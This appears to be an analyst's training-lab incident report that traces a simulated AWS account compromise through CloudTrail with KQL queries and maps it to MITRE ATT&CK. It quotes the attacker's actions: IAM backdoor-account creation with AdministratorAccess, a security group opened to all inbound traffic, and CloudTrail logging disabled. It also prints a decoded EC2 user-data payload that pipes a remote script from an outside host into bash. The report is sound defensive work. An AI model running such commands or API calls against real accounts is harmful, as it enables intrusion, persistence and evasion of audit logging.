# Incident Investigation Report: AWS Cloud Account Compromise & Persistence

## Microsoft Sentinel | AWS CloudTrail | IAM / EC2 / S3 Investigation

**Analyst:** Harman Jot<br>
**Environment:** Microsoft Sentinel Training Lab (Azure)<br>
**Primary Platform:** Microsoft Sentinel<br>
**Data Source:** AWS CloudTrail<br>
**Tools:** Microsoft Sentinel, KQL, MITRE ATT&CK<br>
**Related Investigation:** [Investigation 1 — Multi-Stage Endpoint Compromise](../investigation-1/report/investigation-1-multistage-endpoint-compromise.md)

---

## 1. Executive Summary

An investigation of AWS CloudTrail activity identified a multi-stage AWS account compromise involving the IAM user `mirage`.

The activity progressed from cloud reconnaissance to IAM persistence, privilege escalation, unauthorized compute deployment, network exposure, malicious EC2 user-data execution, sensitive S3 data access, and CloudTrail tampering.

The investigation began with a Microsoft Sentinel alert for suspicious AWS CLI activity. Manual hunting against the `AWSCloudTrail` table was then used to identify activity beyond the behavior detected by the original analytics rule.

The investigation established the following logical attack progression:

**Sentinel Alert → Cloud Reconnaissance → IAM Persistence → Privilege Escalation → EC2 Deployment → Data Access → CloudTrail Tampering → Cross-Environment Correlation**

The AWS activity also shares the username `mirage` and source IP `198.51.100.42` with the related Windows endpoint investigation involving `win11a`. This provides a strong cross-environment correlation point, although the available evidence does not establish the exact credential-transfer mechanism between the environments.

---

## 2. Triggering Alerts

| Alert                                         | Category       | Severity | Count |
| --------------------------------------------- | -------------- | -------: | ----: |
| Suspicious AWS CLI Command Execution          | Reconnaissance |   Medium |     2 |
| AWS Config Service Resource Deletion Attempts | —              |      Low |     3 |

### Suspicious AWS CLI Command Execution

**Rule:** `Suspicious AWS CLI Command Execution`
**First activity:** August 8, 2026, 8:33:00 AM
**Last activity:** August 8, 2026, 8:33:00 AM
**Alert generated:** August 9, 2026, 8:05:40 AM
**User:** `mirage`
**Source IP:** `198.51.100.42`
**Severity:** Medium

The alert identified AWS reconnaissance operations including:

```text
iam.list-users
iam.list-groups
iam.list-roles
iam.get-user
iam.list-access-keys
ec2.describe-vpcs
ec2.describe-subnets
ec2.describe-security-groups
ec2.describe-network-interfaces
kms.list-keys
```

The alert established the reconnaissance phase but did not by itself establish the later persistence, compute deployment, data access, or CloudTrail tampering.

Those behaviors were identified through manual `AWSCloudTrail` hunting.

### Alert Timing Note

The alert was generated approximately 24 hours after the recorded activity. The timing difference is documented as observed in the training-lab dataset and is not interpreted as real-time SIEM detection latency.

---

## 3. Investigation Scope

### Primary Identity

```text
mirage
```

### Persistence Identity

```text
backdoor-svc
```

### AWS Account

```text
123456789012
```

### Primary Source IP

```text
198.51.100.42
```

### Additional Source IP

```text
203.0.113.77
```

The additional IP was observed during later activity associated with `backdoor-svc`.

### Relevant AWS Resources

```text
S3 bucket: corp-data-prod
CloudTrail trail: management-events-trail
Security group: sg-0a1b2c3d4e5f67890
EC2 instance: i-0a1b2c3d4e5f00001
Remote payload host: 185.220.101.55
```

---

## 4. Investigation Workflow

1. Reviewed the Microsoft Sentinel `Suspicious AWS CLI Command Execution` alert.
2. Established the `mirage` identity and source IP `198.51.100.42`.
3. Expanded the investigation using `AWSCloudTrail` queries.
4. Investigated IAM account-creation activity for persistence.
5. Pivoted to `backdoor-svc` to identify account configuration and privileges.
6. Investigated EC2 deployment and security-group modification activity.
7. Decoded the EC2 user-data payload.
8. Investigated S3 object retrieval activity.
9. Investigated CloudTrail logging disruption and trail deletion.
10. Correlated the AWS identity and source IP with the related Windows endpoint investigation.

---

## 5. KQL Investigation

### 5.1 AWS Activity Baseline

```kql
AWSCloudTrail
| where UserIdentityUserName == "mirage"
    and SourceIpAddress == "198.51.100.42"
| project UserIdentityType, EventName, EventTypeName, UserAgent
```

**Purpose:** Establish AWS activity associated with the `mirage` identity and source IP and identify the event and user-agent context.

---

### 5.2 Persistence — IAM Account Creation

```kql
AWSCloudTrail
| where UserIdentityUserName == "mirage"
    and SourceIpAddress == "198.51.100.42"
    and * contains "create"
| project UserIdentityType, UserIdentityUserName, EventName, RequestParameters
```

**Purpose:** Identify account-creation and related IAM management activity performed by `mirage`.

The query identified the creation of the secondary IAM identity:

```text
CreateUser
```

```json
{"userName":"backdoor-svc"}
```

Related account-management activity included:

```text
CreateAccessKey
CreateLoginProfile
```

---

### 5.3 Persistence Account Investigation

```kql
AWSCloudTrail
| where UserIdentityUserName == "mirage"
    and SourceIpAddress == "198.51.100.42"
    and * contains "backdoor-svc"
| project UserIdentityType, UserIdentityUserName, EventName, RequestParameters
```

**Purpose:** Examine CloudTrail events associated with the newly created `backdoor-svc` identity.

The investigation identified:

```text
CreateUser
```

```json
{"userName":"backdoor-svc"}
```

```text
CreateAccessKey
```

```json
{"userName":"backdoor-svc"}
```

```text
AttachUserPolicy
```

```json
{"userName":"backdoor-svc","policyArn":"arn:aws:iam::aws:policy/AdministratorAccess"}
```

```text
CreateLoginProfile
```

```json
{"userName":"backdoor-svc","passwordResetRequired":false}
```

These events demonstrate that the secondary account was created and configured for continued access with administrative privileges.

---

### 5.4 Compute Deployment and Network Exposure

```kql
AWSCloudTrail
| where UserIdentityUserName == "mirage"
    and SourceIpAddress == "198.51.100.42"
| where EventName in ("RunInstances", "AuthorizeSecurityGroupIngress", "ModifyInstanceAttribute")
| project UserIdentityUserName, EventName, RequestParameters
```

**Purpose:** Investigate EC2 deployment, network exposure, and instance configuration changes.

The investigation identified:

```text
AuthorizeSecurityGroupIngress
```

with:

```json
{"groupId":"sg-0a1b2c3d4e5f67890","ipPermissions":{"items":[{"ipProtocol":"-1","ipRanges":{"items":[{"cidrIp":"0.0.0.0/0"}]}}]}}
```

This configured unrestricted inbound access from `0.0.0.0/0` for all protocols.

The same investigation identified:

```text
RunInstances
```

with:

```json
{"instanceType":"p3.16xlarge","imageId":"ami-0abcdef1234567890","minCount":5,"maxCount":5}
```

This indicates that five GPU-class EC2 instances were launched.

The investigation also identified:

```text
ModifyInstanceAttribute
```

containing a base64-encoded EC2 user-data value.

---

### 5.5 Data Access — S3 Object Retrieval

```kql
AWSCloudTrail
| where UserIdentityUserName == "mirage"
    and SourceIpAddress == "198.51.100.42"
    and * contains "Get"
| where EventSource == "s3.amazonaws.com"
| project UserIdentityUserName, EventName, EventSource, RequestParameters
```

**Purpose:** Identify S3 object retrieval activity associated with the compromised identity.

The investigation identified access to:

```text
corp-data-prod/finance/2026-budget-final.xlsx
corp-data-prod/hr/employee-records-full.csv
corp-data-prod/secrets/api-keys-production.json
```

The objects represented financial information, employee/HR information, and production credential material.

---

### 5.6 Anti-Forensics — CloudTrail Activity

```kql
AWSCloudTrail
| where UserIdentityUserName == "mirage"
    and SourceIpAddress == "198.51.100.42"
| where EventSource == "cloudtrail.amazonaws.com"
| project UserIdentityUserName, EventName, RequestParameters
```

**Purpose:** Identify CloudTrail service activity affecting AWS audit logging.

The investigation identified:

```text
StopLogging
```

```json
{"name":"management-events-trail"}
```

followed by:

```text
DeleteTrail
```

```json
{"name":"management-events-trail"}
```

This demonstrates an attempt to disable and remove the CloudTrail audit trail.

---

## 6. Investigation Findings

### 6.1 Cloud Reconnaissance

The initial Sentinel alert identified reconnaissance performed by `mirage`.

Observed operations included:

```text
ListUsers
ListGroups
ListRoles
GetUser
ListAccessKeys
DescribeVpcs
DescribeSubnets
DescribeSecurityGroups
DescribeNetworkInterfaces
ListKeys
```

The activity covered IAM identities, roles, access keys, network infrastructure, security groups, network interfaces, and KMS keys.

This established the initial cloud-environment discovery phase.

**MITRE ATT&CK:**

* T1580 — Cloud Infrastructure Discovery
* T1526 — Cloud Service Discovery

---

### 6.2 Persistence and Privilege Escalation

CloudTrail showed that `mirage` created:

```text
backdoor-svc
```

The account was then configured with:

* An access key
* A console login profile
* `AdministratorAccess`

The administrative policy was:

```text
arn:aws:iam::aws:policy/AdministratorAccess
```

This established a persistent secondary identity with administrative permissions.

**MITRE ATT&CK:**

* T1136.003 — Create Account: Cloud Account
* T1098 — Account Manipulation

---

### 6.3 Unauthorized Compute Deployment

The compromised `mirage` identity launched:

```text
5 × p3.16xlarge
```

instances.

A security group was also modified to permit:

```text
0.0.0.0/0
```

for all protocols.

The combination of large GPU-class compute deployment and unrestricted inbound exposure is inconsistent with normal low-risk account activity and is consistent with unauthorized attacker-controlled infrastructure.

The exact purpose of the GPU infrastructure cannot be conclusively established from the available evidence. Possible explanations include unauthorized compute use, cryptomining, or staging infrastructure.

**MITRE ATT&CK:**

* T1496 — Resource Hijacking, if the compute was used for unauthorized resource consumption.

---

### 6.4 Malicious EC2 User-Data

The deployed EC2 infrastructure was investigated for attacker-controlled startup configuration.

A `ModifyInstanceAttribute` event associated with the EC2 service contained the following Base64-encoded user-data for the instance:

```text
IyEvYmluL2Jhc2gKY3VybCBodHRwczovLzE4NS4yMjAuMTAxLjU1L3NoZWxsLnNoIHwgYmFzaA==
```

The Base64 content was decoded during analysis to:
```text
#!/bin/bash
curl https://185.220.101.55/shell.sh | bash
```

The decoded user-data is a shell script that attempts to download shell.sh from the remote host 185.220.101.55 and pipe the downloaded content directly to bash.

The ModifyInstanceAttribute event identifies ec2.amazonaws.com as the event source and provides the encoded userData value as part of the EC2 instance configuration change.

This provides direct CloudTrail evidence of attacker-controlled EC2 startup configuration containing a remote download-and-execute command.

The evidence supports the presence of a malicious user-data payload; it does not, by itself, establish that the downloaded script was successfully executed or that the remote host was successfully reached.

---

### 6.5 Sensitive S3 Data Access

The compromised identity retrieved three objects from:

```text
corp-data-prod
```

The objects were:

```text
finance/2026-budget-final.xlsx
hr/employee-records-full.csv
secrets/api-keys-production.json
```

The accessed data represented:

* Financial information
* Employee/HR information
* Production credential material

The activity therefore demonstrates access to multiple categories of sensitive cloud-stored data.

**MITRE ATT&CK:** T1530 — Data from Cloud Storage

---

### 6.6 CloudTrail Anti-Forensics

The investigation identified:

```text
StopLogging
```

against:

```text
management-events-trail
```

followed by:

```text
DeleteTrail
```

against the same trail.

This represents an attempt to disable and remove AWS audit logging.

The behavior is significant because it directly reduces visibility into subsequent cloud activity.

**MITRE ATT&CK:** T1685.002 — Disable or Modify Cloud Log

---

## 7. Attack Chain

The available evidence supports the following logical attack progression:

```text
Compromised IAM Identity
        ↓
Cloud / IAM Reconnaissance
        ↓
Create backdoor-svc IAM Account
        ↓
Create Access Key + Console Login
        ↓
Attach AdministratorAccess
        ↓
Open Security Group to 0.0.0.0/0
        ↓
Deploy 5 GPU-Class EC2 Instances
        ↓
Configure Malicious EC2 User-Data
        ↓
Access Sensitive S3 Objects
        ↓
Disable CloudTrail Logging
        ↓
Delete CloudTrail Trail
```

This sequence represents the logical and dependency-based order of the observed behaviors rather than a precise event-level timeline.

---

## 8. Timeline and Data-Quality Note

The available training-lab CloudTrail data does not provide reliable event-level timing for reconstructing a precise second-by-second attack timeline.

Multiple records share the same `TimeGenerated` value, and other session-related timestamp fields do not provide a sufficiently reliable chronological sequence.

Therefore, this investigation does not assign artificial timestamps to individual actions.

The attack chain is instead presented using:

* Observed CloudTrail activity
* Logical dependencies between actions
* Relationships between the IAM identities
* Progression from reconnaissance to persistence, privilege escalation, compute deployment, data access, and anti-forensics

For example, `backdoor-svc` must have existed before an access key or login profile could be configured for that account.

This approach avoids presenting identical lab-generated timestamps as if they represented a precise real-world attack timeline.

---

## 9. Cross-Environment Correlation

| Indicator            | Windows Investigation                         | AWS Investigation             |
| -------------------- | --------------------------------------------- | ----------------------------- |
| Username             | `mirage`                                      | `mirage`                      |
| Source / External IP | `198.51.100.42` observed in detection context | `198.51.100.42`               |
| Environment          | `win11a`                                      | AWS account `123456789012`    |
| Anti-Forensics       | Windows Security Event ID 1102                | `StopLogging` + `DeleteTrail` |

The username `mirage` and source IP `198.51.100.42` appear in both investigations.

This provides a strong cross-environment correlation point and supports the assessment that the same compromised identity or session context was involved in both the Windows and AWS activity.

The available evidence does not independently prove the exact credential-transfer mechanism between the Windows endpoint and AWS.

Possible mechanisms include credential reuse, an exposed access key, or an already-authenticated AWS session.

The report therefore establishes the correlation without claiming an unobserved credential-theft mechanism.

---

## 10. MITRE ATT&CK Mapping

| Tactic                             | Technique                                 | Evidence                                                               |
| ---------------------------------- | ----------------------------------------- | ---------------------------------------------------------------------- |
| Discovery                          | T1580 — Cloud Infrastructure Discovery    | AWS network, security-group, interface, and infrastructure enumeration |
| Discovery                          | T1526 — Cloud Service Discovery           | AWS service and IAM enumeration                                        |
| Persistence                        | T1136.003 — Create Account: Cloud Account | `CreateUser` for `backdoor-svc`                                        |
| Persistence / Privilege Escalation | T1098 — Account Manipulation              | `AttachUserPolicy` assigning `AdministratorAccess`                     |
| Defense Evasion                    | T1685.002 — Disable or Modify Cloud Log   | `StopLogging` and `DeleteTrail`                                        |
| Collection                         | T1530 — Data from Cloud Storage           | S3 object retrievals                                                   |
| Impact                             | T1496 — Resource Hijacking                | Five `p3.16xlarge` instances; possible unauthorized compute use        |
| Execution                          | AWS EC2 user-data execution behavior      | Base64 user-data downloading and executing remote shell code           |

ATT&CK mappings are based on behaviors directly supported by the available CloudTrail evidence. Where the exact ATT&CK technique does not map one-to-one to an AWS API action, the report avoids assigning a more specific technique than the evidence supports.

---

## 11. Indicators of Compromise

| Type             | Value                              | Relevance                                                                             |
| ---------------- | ---------------------------------- | ------------------------------------------------------------------------------------- |
| IAM User         | `mirage`                           | Compromised/attacker-controlled identity                                              |
| IAM User         | `backdoor-svc`                     | Attacker-created persistence account                                                  |
| Access Key       | `AKIAI99ATTACKKEY`                 | Access key associated with `backdoor-svc`                                             |
| Source IP        | `198.51.100.42`                    | AWS activity associated with `mirage`; also observed in related Windows investigation |
| Source IP        | `203.0.113.77`                     | Later `backdoor-svc` login location                                                   |
| S3 Bucket        | `corp-data-prod`                   | Source of sensitive data accessed by `mirage`                                         |
| S3 Object        | `finance/2026-budget-final.xlsx`   | Financial data accessed                                                               |
| S3 Object        | `hr/employee-records-full.csv`     | HR/employee data accessed                                                             |
| S3 Object        | `secrets/api-keys-production.json` | Production credential material accessed                                               |
| Security Group   | `sg-0a1b2c3d4e5f67890`             | Modified to allow unrestricted inbound access                                         |
| EC2 Instance     | `i-0a1b2c3d4e5f00001`              | Instance associated with malicious user-data                                          |
| Remote Host      | `185.220.101.55`                   | Remote payload host referenced by user-data                                           |
| CloudTrail Trail | `management-events-trail`          | Disabled and deleted                                                                  |
| Instance Type    | `p3.16xlarge`                      | GPU-class compute deployed                                                            |

> **Lab-data note:** The IP addresses in this dataset include RFC 5737 documentation/test ranges and simulated telemetry. They should not be treated as real-world indicators without independent validation.

---

## 12. Evidence and Screenshots

```text
Screenshots/
├── 01_sentinel_alert_suspicious_aws_cli_reconnaissance.png
├── 02_sentinel_aws_config_deletion_alert.png
├── 03_discovery_iam_enumeration.png
├── 04_persistence_backdoor_IAM_account_creation.png
├── 05_privilege_escalation_administrator_access.png
├── 06_compute_deployment_ec2_and_malicious_userdata.png
├── 07_data_access_s3_sensitive_objects.png
├── 08_anti_forensics_cloudtrail_tampering.png
└── 09_cross_environment_correlation_mirage_source_ip.png
```

### Evidence Mapping

| Screenshot                                                | Evidence Demonstrated                                                                                                                                                                                                                                    |
| --------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `01_sentinel_alert_suspicious_aws_cli_reconnaissance.png` | Microsoft Sentinel alert identifying suspicious AWS CLI reconnaissance performed by `mirage`, including the associated source IP `198.51.100.42`.                                                                                                        |
| `02_sentinel_aws_config_deletion_alert.png`               | Microsoft Sentinel alert for AWS Config service resource deletion activity, providing additional evidence of suspicious cloud-account activity.                                                                                                          |
| `03_discovery_iam_enumeration.png`                        | AWS CloudTrail evidence of IAM and cloud-environment reconnaissance, including operations such as `ListUsers`, `ListGroups`, `ListRoles`, `GetUser`, `ListAccessKeys`, and EC2/KMS discovery activity.                                                   |
| `04_persistence_backdoor_IAM_account_creation.png`        | Creation and configuration of the unauthorized `backdoor-svc` IAM identity, including account creation, access-key creation, and console login-profile activity.                                                                                         |
| `05_privilege_escalation_administrator_access.png`        | Assignment of `AdministratorAccess` to `backdoor-svc`, demonstrating privilege escalation and administrative control of the secondary IAM identity.                                                                                                      |
| `06_compute_deployment_ec2_and_malicious_userdata.png`    | Unauthorized EC2 compute deployment and malicious EC2 user-data. The evidence includes EC2 activity and the `ModifyInstanceAttribute` event containing Base64-encoded user-data. The decoded payload was `curl https://185.220.101.55/shell.sh \| bash`. |
| `07_data_access_s3_sensitive_objects.png`                 | CloudTrail `GetObject` activity against sensitive S3 objects, including financial, HR, and production credential material.                                                                                                                               |
| `08_anti_forensics_cloudtrail_tampering.png`              | `StopLogging` and `DeleteTrail` activity targeting `management-events-trail`, demonstrating attempted CloudTrail audit-log disruption.                                                                                                                   |
| `09_cross_environment_correlation_mirage_source_ip.png`   | Correlation between the AWS investigation and the related `win11a` endpoint investigation using the shared `mirage` username and source IP `198.51.100.42`.                                                                                              |


---

## 13. Recommendations

1. Disable and investigate the compromised `mirage` IAM identity.
2. Immediately deactivate and remove the unauthorized `backdoor-svc` identity.
3. Rotate and revoke associated access keys.
4. Remove `AdministratorAccess` from unauthorized identities.
5. Terminate unauthorized EC2 instances after preserving relevant evidence.
6. Review the affected security group and remove the unrestricted `0.0.0.0/0` inbound rule.
7. Investigate the EC2 instances for execution of the downloaded payload.
8. Investigate the remote payload host `185.220.101.55`.
9. Review S3 access and determine whether the retrieved objects were exfiltrated or accessed further.
10. Restore CloudTrail logging and verify that audit coverage is functioning.
11. Review other AWS accounts, IAM identities, access keys, and resources for related activity.
12. Correlate AWS authentication activity with the related `win11a` endpoint investigation.
13. Treat the incident as a cross-environment compromise rather than an isolated AWS event.

---

## 14. Investigation Conclusion

The investigation identified a multi-stage AWS cloud compromise beginning with reconnaissance and progressing through persistence, privilege escalation, unauthorized infrastructure deployment, sensitive data access, and CloudTrail tampering.

The evidence supports the following attack chain:

```text
AWS Reconnaissance
        ↓
IAM Persistence
        ↓
Privilege Escalation
        ↓
Network Exposure
        ↓
GPU Compute Deployment
        ↓
Malicious EC2 User-Data
        ↓
Sensitive S3 Data Access
        ↓
CloudTrail Tampering
```

The creation and administrative configuration of `backdoor-svc`, deployment of five GPU-class instances, retrieval of sensitive S3 objects, and subsequent CloudTrail disruption demonstrate activity substantially beyond the reconnaissance behavior detected by the original Sentinel alert.

The matching `mirage` username and `198.51.100.42` source IP provide an important correlation between this AWS investigation and the related `win11a` endpoint investigation.

This investigation demonstrates practical SOC capabilities across:

* Microsoft Sentinel
* AWS CloudTrail
* KQL threat hunting
* IAM investigation
* Cloud infrastructure analysis
* S3 data-access investigation
* Cloud audit-log tampering detection
* Cross-environment correlation
* MITRE ATT&CK mapping
* Evidence-based incident analysis

---

*This investigation was conducted in a Microsoft Sentinel Training Lab environment using Microsoft's publicly available Sentinel Training Lab dataset as part of independent SOC analyst skills development.*
